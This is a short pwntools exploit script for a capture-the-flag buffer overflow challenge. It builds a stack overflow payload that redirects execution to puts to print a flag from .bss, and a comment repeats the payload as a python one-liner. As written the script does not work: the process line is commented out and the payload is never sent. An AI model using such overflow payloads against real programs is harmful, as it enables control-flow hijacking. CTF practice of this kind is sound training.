from pwn import *

context(log_level='debug')

#io=process("./bjdctf_2020_babyrop")

#溢出 puts bss上的flag 

payload=b'A'*(0x18+0x4)+p32(0x80484c0)+b'BBBB'+p32(0x804a080)

#python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x84\x04\x08BBBB\x80\xa0\x04\x08'" |xargs ./PicoCTF_2018_buffer_overflow_0

io.interactive()